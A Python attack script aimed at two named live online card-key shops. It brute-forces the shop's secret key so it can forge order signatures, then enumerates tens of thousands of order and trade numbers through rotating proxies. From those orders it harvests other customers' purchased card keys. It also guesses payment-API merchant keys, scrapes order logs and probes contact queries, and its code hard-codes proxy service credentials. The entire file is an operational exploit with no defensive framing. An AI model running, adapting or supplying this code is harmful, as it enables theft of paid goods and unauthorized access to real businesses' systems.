#!/usr/bin/env python3
"""
彩虹发卡卡密深挖（hmjf / qq8 通用）
成功链路：submit 存在 → getshop/query → showOrder → ajax order → kminfo
skey = md5(id + SYS_KEY + id)
"""
import hashlib, json, os, random, re, subprocess, sys, time, urllib.parse
from datetime import datetime, timedelta

TARGETS = {
    "hmjf": {"base": "https://hmjf.lol/shop", "epay_pid": "1003", "keys_extra": ["hmjf", "xuxin", "虚心U"]},
    "qq8": {"base": "https://qq8.one", "epay_pid": "542", "keys_extra": ["qq8", "xmqq", "aiqq", "熊猫QQ", "熊猫"]},
}

def main():
    name = sys.argv[1] if len(sys.argv) > 1 else "qq8"
    cfg = TARGETS[name]
    BASE = cfg["base"]
    REF = BASE + "/" if not BASE.endswith("/") else BASE
    EPAY = "http://api.ttwl66.cn"
    OUT = os.environ.get("KAMI_OUT", f"/data/automation/results/{name}.one/kami_deep_20260716" if name == "qq8"
                                    else f"/data/automation/results/hmjf.lol/kami_mine_20260716")
    os.makedirs(OUT, exist_ok=True)
    ENV = "/data/config/proxy.env"
    FETCH = "/data/automation/bin/qg-proxy-fetch.sh"
    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
    CK = f"{OUT}/.cookies"
    LOG = open(f"{OUT}/deep.log", "a", buffering=1)
    R = {"hits": [], "paid": [], "exists": [], "sys_key": None, "target": name}
    N = 0

    def log(m):
        print(m, flush=True)
        LOG.write(m + "\n")

    def px():
        for l in open(ENV):
            if l.startswith("PROXY_URL="):
                return l.split("=", 1)[1].strip().strip('"')
        return ""

    PX = px()

    def refresh():
        nonlocal PX
        subprocess.run(["bash", FETCH], capture_output=True,
                       env={**os.environ, "QG_AUTHKEY": "02E76F93", "QG_AUTHPWD": "A0FFB679553D"})
        PX = px()
        time.sleep(1)

    def go(url, post=None, timeout=14, retries=2):
        nonlocal N, PX
        for attempt in range(retries + 1):
            N += 1
            if N % 80 == 0:
                refresh()
            c = ["curl", "-s", "-w", "\n__C:%{http_code}__", "--max-time", str(timeout),
                 "-A", UA, "-H", f"Referer: {REF}", "-x", PX, "-b", CK, "-c", CK, "-k", "-L"]
            if post is not None:
                c += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
            c.append(url)
            try:
                raw = subprocess.run(c, capture_output=True, text=True, timeout=timeout + 5).stdout or ""
                if not raw.strip() and attempt < retries:
                    refresh()
                    time.sleep(1)
                    continue
                m = re.search(r"__C:(\d+)__", raw)
                body = raw[:m.start()] if m else raw
                code = int(m.group(1)) if m else 0
                if code == 0 and not body.strip() and attempt < retries:
                    refresh()
                    continue
                return body, code
            except Exception as e:
                if attempt < retries:
                    refresh()
                    continue
                return str(e), 0
        return "", 0

    def save():
        json.dump(R, open(f"{OUT}/deep_results.json", "w"), ensure_ascii=False, indent=2)

    def hit(tag, data):
        ent = {"via": tag, "ts": datetime.now().isoformat(), "data": data}
        R["hits"].append(ent)
        log(f"*** HIT [{tag}] {str(data)[:400]}")
        with open(f"{OUT}/kami_hits.jsonl", "a") as f:
            f.write(json.dumps(ent, ensure_ascii=False) + "\n")
        save()

    def skey_for(oid, sys_key):
        return hashlib.md5(f"{oid}{sys_key}{oid}".encode()).hexdigest()

    def order_exists(tn):
        body, _ = go(f"{BASE}/other/submit.php?type=alipay&orderid={tn}")
        if not body.strip():
            return "empty"
        if "该订单号不存在" in body:
            return False
        if "window.location" in body or "location.href" in body or 'name="pid"' in body:
            return True
        return "unknown"

    def extract_kami(tn):
        gs, _ = go(f"{BASE}/other/getshop.php?trade_no={tn}")
        qh, _ = go(f"{BASE}/?mod=query&data={tn}")
        qb, _ = go(f"{BASE}/ajax.php?act=query", f"type=1&qq={tn}")
        rec = {"trade_no": tn, "getshop": gs[:300], "query_ajax": qb[:300]}
        paid = False
        kminfo = None
        try:
            gj = json.loads(gs)
            if gj.get("kminfo"):
                kminfo = gj["kminfo"]
                paid = True
            elif gj.get("msg") and gj.get("msg") != "未付款":
                paid = True
        except Exception:
            pass
        som = re.search(r"showOrder\s*\(\s*(\d+)\s*,\s*'([a-f0-9]{32})'", qh)
        if som:
            oid, sk = som.groups()
            rec["id"], rec["skey"] = oid, sk
            oh, _ = go(f"{BASE}/ajax.php?act=order", f"id={oid}&skey={sk}")
            rec["order_resp"] = oh[:300]
            try:
                oj = json.loads(oh)
                if oj.get("kminfo"):
                    kminfo = oj["kminfo"]
                    paid = True
            except Exception:
                if "kminfo" in oh.lower():
                    kminfo = oh[:500]
                    paid = True
        if qb and '"data"' in qb:
            try:
                for row in json.loads(qb).get("data", []):
                    oid, sk = row.get("id"), row.get("skey")
                    if oid and sk:
                        oh, _ = go(f"{BASE}/ajax.php?act=order", f"id={oid}&skey={sk}")
                        try:
                            oj = json.loads(oh)
                            if oj.get("kminfo"):
                                kminfo = oj["kminfo"]
                                paid = True
                                rec["from_ajax_query"] = True
                        except Exception:
                            pass
            except Exception:
                pass
        rec["paid"] = paid
        rec["kminfo"] = kminfo
        if kminfo:
            hit("KMINFO", rec)
        elif paid:
            hit("PAID_NO_KM", rec)
            R["paid"].append(rec)
        else:
            R["exists"].append(rec)
        return rec

    def try_order(oid, sk, tag=""):
        oh, _ = go(f"{BASE}/ajax.php?act=order", f"id={oid}&skey={sk}")
        if not oh or "验证失败" in oh:
            return None
        try:
            j = json.loads(oh)
            if j.get("kminfo"):
                hit(f"kminfo_{tag}", {"id": oid, "skey": sk, "data": j})
                return j
            if j.get("code") == 0:
                hit(f"order_ok_{tag}", {"id": oid, "skey": sk, "body": j})
                return j
        except Exception:
            if "kminfo" in oh.lower():
                hit(f"kminfo_raw_{tag}", {"id": oid, "raw": oh[:400]})
        return None

    # ── 0 init ──
    log(f"[0] start target={name} base={BASE}")
    go(BASE + "/" if not BASE.endswith("/") else BASE)
    body, _ = go(f"{BASE}/ajax.php?act=getcount", "")
    log(f"getcount: {body[:150]}")
    save()

    KEYS = ["", "123456", "123456789", "admin", "secret", "faka", "shua", "caihong", "rainbow",
            "kakayun", "666666", "888888", "1003", "542", "ttwl66", "datou111", "datou333",
            "TFQrPKpDjzLhQ288jv9tkFTj66Hqz1L76x"] + cfg["keys_extra"]

    # ── A SYS_KEY ──
    log("[A] SYS_KEY brute id 1-800")
    for sk in KEYS:
        for oid in range(1, 801):
            calc = skey_for(oid, sk)
            if try_order(oid, calc, f"sk_{sk[:6]}"):
                R["sys_key"] = sk
                hit("SYS_KEY", {"key": sk, "id": oid})
                break
        if R["sys_key"]:
            break
        time.sleep(0.02)
    if R["sys_key"]:
        log(f"[A2] batch id 1-15000 sys_key={R['sys_key']!r}")
        for oid in range(1, 15001):
            try_order(oid, skey_for(oid, R["sys_key"]), "batch")
            if oid % 1000 == 0:
                log(f"  batch {oid}")
            time.sleep(0.05)
    save()

    # ── B 今日高峰分钟全后缀 ──
    log("[B] today dense scan")
    now = datetime.now()
    date = now.strftime("%Y%m%d")
    hours = [(now.hour - i) % 24 for i in range(6)]
    found = 0
    for h in sorted(set(hours)):
        for m in range(60):
            for s in range(0, 60, 10):  # 每10秒一桶
                prefix = f"{date}{h:02d}{m:02d}{s:02d}"
                for suf in range(0, 1000, 1 if found < 3 else 5):  # 找到后放慢
                    tn = f"{prefix}{suf:03d}"
                    ex = order_exists(tn)
                    if ex is False:
                        continue
                    if ex == "empty":
                        refresh()
                        continue
                    found += 1
                    log(f"  EXIST #{found} {tn}")
                    extract_kami(tn)
                    time.sleep(0.08)
            if m % 15 == 0:
                log(f"  {prefix[:10]}.. m={m} found={found} hits={len(R['hits'])}")
                save()
    save()

    # ── C 历史窗随机强化 ──
    log("[C] weighted random 50000")
    start = datetime(2025, 11, 1)
    rh = 0
    for i in range(1, 50001):
        d = start + timedelta(days=random.randint(0, 258))
        h, mi, s = random.randint(8, 23), random.randint(0, 59), random.randint(0, 59)
        tn = f"{d.strftime('%Y%m%d')}{h:02d}{mi:02d}{s:02d}{random.randint(0, 999):03d}"
        ex = order_exists(tn)
        if ex is True:
            rh += 1
            extract_kami(tn)
        if i % 2000 == 0:
            log(f"  random {i}/50000 exists={rh} hits={len(R['hits'])}")
            save()
        time.sleep(0.04)
    save()

    # ── D epay key ──
    log(f"[D] epay pid={cfg['epay_pid']}")
    for key in KEYS:
        url = f"{EPAY}/api.php?act=order&pid={cfg['epay_pid']}&key={urllib.parse.quote(key)}&out_trade_no=20260716100000001"
        body, _ = go(url, timeout=12)
        if body and "trade_no" in body and "密钥" not in body:
            hit("epay_key", {"key": key, "body": body[:300]})
        time.sleep(0.2)
    save()

    # ── E toollogs + contact query ──
    log("[E] toollogs + contact")
    tl, _ = go(f"{BASE}/toollogs.php")
    for tn in set(re.findall(r"20\d{15}", tl)):
        if order_exists(tn) is True:
            extract_kami(tn)
    for c in ["13800138000", "18888888888", "test", "qq", "12345678901"]:
        qb, _ = go(f"{BASE}/ajax.php?act=query", f"type=1&qq={c}")
        if qb and '"data"' in qb and len(qb) > 80:
            hit("contact_query", {"c": c, "body": qb[:500]})
    save()

    log(f"DONE hits={len(R['hits'])} paid={len(R['paid'])} exists={len(R['exists'])} sys_key={R['sys_key']}")
    LOG.close()

if __name__ == "__main__":
    main()
